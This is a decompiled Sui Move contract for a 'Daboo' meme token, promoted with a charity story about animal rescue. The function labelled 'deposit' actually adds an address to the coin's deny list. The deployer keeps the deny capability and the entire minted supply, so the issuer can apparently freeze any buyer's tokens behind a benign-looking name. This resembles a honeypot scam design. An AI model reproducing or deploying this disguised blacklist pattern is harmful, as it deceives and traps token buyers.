module 0x92b07ca3eeb6028c572ee80b34a7b81145f183bb20b296f5a426af4248df84ac::daboo {
    struct DABOO has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DABOO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DABOO>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: DABOO, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://cdn.dexscreener.com/cms/images/V7dAENLjebtpM36f?width=56&height=56&fit=crop&quality=95&format=auto                                                                                                                                                                                                                      ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<DABOO>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"Daboo   ")))), trim_right(b"Daboo                           "), trim_right(b"To honor the incredible bravery of Daboo, a heartfelt movement has been created to keep his memory alive.The initiative celebrates Daboo's unwavering loyalty and courage while promoting causes that align with his heroic spirit, such as animal rescue efforts, shelter funding, and pet safety awareness.                   "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DABOO>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DABOO>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<DABOO>>(0x2::coin::mint<DABOO>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DABOO>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

